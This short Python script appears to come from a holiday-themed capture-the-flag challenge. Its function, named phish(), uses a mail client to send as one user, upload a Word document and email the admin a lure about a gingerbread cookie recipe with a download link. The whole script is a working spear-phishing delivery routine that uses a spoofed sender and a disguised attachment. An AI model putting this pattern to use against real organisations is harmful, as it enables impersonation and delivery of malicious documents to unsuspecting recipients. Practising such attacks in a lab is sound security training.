#!/usr/bin/env python3
from ewa import EWA

def phish():
    f = "jessica.claus@northpolechristmastown.com"
    to = "admin@northpolechristmastown.com"
    subject = "gingerbread cookie recipe"

    body = "hello!"

    m = EWA()
    link = m.upload(f, "../output/gingerbread cookie recipe.docx")
    assert link != ""
    print("File uploaded and available at", link)

    body = "gingerbread cookie recipe\nATTACHED FILE DOWNLOAD HERE: {}".format(link)
    resp = m.send_mail(f, to, subject, body)
    print("Sending:\n", body)
    print()
    print(resp)

if __name__ == "__main__":
    phish()
